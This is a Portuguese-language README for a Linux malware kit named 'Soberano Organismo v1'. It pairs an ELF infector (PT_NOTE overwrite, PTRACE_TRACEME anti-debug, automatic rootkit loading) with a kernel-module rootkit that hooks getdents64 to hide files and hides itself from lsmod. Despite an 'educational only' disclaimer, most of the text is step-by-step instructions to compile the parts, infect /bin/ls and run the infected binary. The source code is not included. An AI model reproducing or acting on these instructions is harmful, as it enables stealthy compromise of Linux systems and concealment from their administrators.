# Soberano Organismo v1 - Educational Linux Persistence & Stealth

**Aviso importante**: Este material é **puramente educacional** e destinado a pesquisa em ambientes controlados (VMs isoladas). Não use em sistemas de produção ou sem autorização. O objetivo é estudar técnicas de persistência e stealth no Linux.

## Componentes

### 1. infector_integrado.c
- PT_NOTE Overwrite (stealth máximo — mantém o tamanho original do arquivo)
- Anti-debug via PTRACE_TRACEME
- Integração automática com o LKM (carrega o rootkit se não estiver presente)

### 2. soberano_hide.c
- LKM rootkit educacional
- Hook de `getdents64` (esconde arquivos com "secreto" ou "payload" no nome)
- Auto-hide do próprio módulo (`lsmod` não mostra)

## Como usar (passo a passo)

```bash
# 1. Compile o LKM (precisa de kernel headers)
make -C /lib/modules/$(uname -r)/build M=$PWD modules
cp soberano_hide.ko /tmp/

# 2. Compile o infector
gcc -o infector_integrado infector_integrado.c -O2 -s

# 3. Infecte um binário (exemplo com ls)
./infector_integrado /bin/ls /tmp/ls_soberano

# 4. Execute o binário infectado
/tmp/ls_soberano
